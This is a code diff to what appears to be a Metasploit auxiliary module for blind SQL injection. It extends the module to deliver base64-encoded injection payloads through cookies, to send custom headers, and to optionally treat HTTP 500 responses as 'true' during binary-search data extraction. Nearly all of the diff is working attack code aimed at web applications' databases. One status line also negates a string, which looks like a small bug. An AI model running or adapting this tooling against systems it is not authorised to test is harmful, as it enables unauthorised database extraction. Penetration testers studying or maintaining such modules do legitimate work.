@@ -24,7 +24,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new("METHOD", [ true, "HTTP method for {PARAM} (GET|POST)", "GET" ]),
+        OptString.new("METHOD", [ true, "HTTP method for {PARAM} (GET|POST|COOKIE)", "GET" ]),
         OptString.new("TARGETURI", [ true, "Vulnerable URI", "/" ]),
         OptString.new("PARAM", [ true, "Vulnerable parameter", "p" ]),
         OptBool.new("BOOL_PATTERN", [ true, "To get the pattern, the injection have to be (FALSE|TRUE)", 0 ]),
@@ -34,6 +34,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new("OTHER_POST_DATA", [ false, "Other POST data, if needed", "" ]),
         OptString.new("DATABASE", [ true, "Targeted database (MySQL|Sqlite)", "MySQL" ]),
         OptString.new("COOKIE", [ false, "Cookie needed to access the SQLi", "" ]),
+        OptString.new("HEADERS", [ false, "Headers needed to access the SQLi", "" ]),
       ])
   end
 
@@ -44,8 +45,17 @@ class MetasploitModule < Msf::Auxiliary
     inj = data['inj_to_send']
     post_data = data['post_data']
     cookie = data['cookie']
+    headers = data['headers']
       
     begin
+      req_headers= {}
+      headers.split(';').each do |x| 
+        req_headers["#{x.split(': ')[0]}"] = "#{x.split(': ')[1]}"
+        for i in 2..x.split(': ').size-1
+          req_headers["#{x.split(': ')[0]}"] += "=#{x.split(': ')[i]}"
+        end
+        vprint_status("req_headers[\"#{x.split(': ')[0]}\"] = \"#{x.split(': ')[1]}\"")
+      end
       if ( method.downcase == "get" && post_data == "" )
         if uri.include?('?')
           req_uri = "#{uri}&#{param}=#{inj}"
@@ -58,7 +68,45 @@ class MetasploitModule < Msf::Auxiliary
           'uri' => req_uri,
           'version' => '1.0',
           'cookie' => cookie,
-          'vhost' => vhost
+          'vhost' => vhost,
+          'headers' => req_headers
+        })
+        return res
+      end
+      if ( method.downcase == "cookie" && post_data == "" )
+        vprint_line("cookie: #{inj}")
+        cookie= "#{param}=#{Rex::Text.uri_encode(Rex::Text.encode_base64(inj))}"
+        vprint_status("GET --cookie #{cookie} #{rhost}/#{req_uri}")
+        res = send_request_raw({
+          'method' => 'GET',
+          'uri' => uri,
+          'version' => '1.0',
+          'cookie' => cookie,
+          'vhost' => vhost,
+          'headers' => req_headers
+        })
+        return res
+      end
+      if ( method.downcase == "cookie" )
+        vprint_line("cookie: #{inj}")
+        cookie= "#{param}=#{Rex::Text.uri_encode(Rex::Text.encode_base64(inj))}"
+        req_post_data= {}
+        post_data.split('&').each do |x| 
+          req_post_data["#{x.split('=')[0]}"] = "#{x.split('=')[1]}"
+          for i in 2..x.split('=').size-1
+            req_post_data["#{x.split('=')[0]}"] += "=#{x.split('=')[i]}"
+          end
+          vprint_status("req_post_data[\"#{x.split('=')[0]}\"] = \"#{x.split('=')[1]}\"")
+        end
+        vprint_status("POST --cookie #{cookie} --data '#{req_post_data.to_s}' #{rhost}/#{uri}")
+        res = send_request_cgi({
+          'method' => 'POST',
+          'uri' => uri,
+          'vars_post' => req_post_data,
+          'version' => '1.0',
+          'cookie' => cookie,
+          'vhost' => vhost,
+          'headers' => req_headers
         })
         return res
       end
@@ -83,7 +131,8 @@ class MetasploitModule < Msf::Auxiliary
           'vars_post' => req_post_data,
           'version' => '1.0',
           'cookie' => cookie,
-          'vhost' => vhost
+          'vhost' => vhost,
+          'headers' => req_headers
         })
         return res
       end
@@ -101,7 +150,8 @@ class MetasploitModule < Msf::Auxiliary
         'vars_post' => req_post_data,
         'version' => '1.0',
         'cookie' => cookie,
-        'vhost' => vhost
+        'vhost' => vhost,
+        'headers' => req_headers
       })
       return res
     rescue Rex::ConnectionError, Errno::ECONNRESET => e
@@ -127,6 +177,7 @@ class MetasploitModule < Msf::Auxiliary
     data['injection'] = datastore['INJECTION']
     data['database'] = datastore['DATABASE'].downcase
     data['cookie'] = datastore['COOKIE']
+    data['headers'] = datastore['HEADERS']
     return data
   end
   
@@ -150,7 +201,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     data['inj_to_send'] = create_injection( data['inj_to_get_true'], "1=2" )
-    print_status("Checking if #{data['method']} #{data['param']}=#{data['inj_to_send']} gives #{data['pattern']}. Should be #{data['bool_pattern'].to_s}.")
+    print_status("Checking if #{data['method']} #{data['param']}=#{data['inj_to_send']} gives #{data['pattern']}. Should be #{!data['bool_pattern'].to_s}.")
     
     res = send_request(data)
     
@@ -194,8 +245,11 @@ class MetasploitModule < Msf::Auxiliary
         else
           min = _next
         end
+#      elsif res.code == 500 ## uncomment if needed : TRUE : max = _next
+#          max = _next
       else
         print_error("Error while connecting to RHOST")
+        
         return 1
       end
       _next = ( min + max + 1 )/2
@@ -229,6 +283,8 @@ class MetasploitModule < Msf::Auxiliary
           else
             min = _next
           end
+#      elsif res.code == 500 ## uncomment if needed : TRUE : max = _next
+#          max = _next
         else 
           print_error("Error while connecting to RHOST")
           return 1
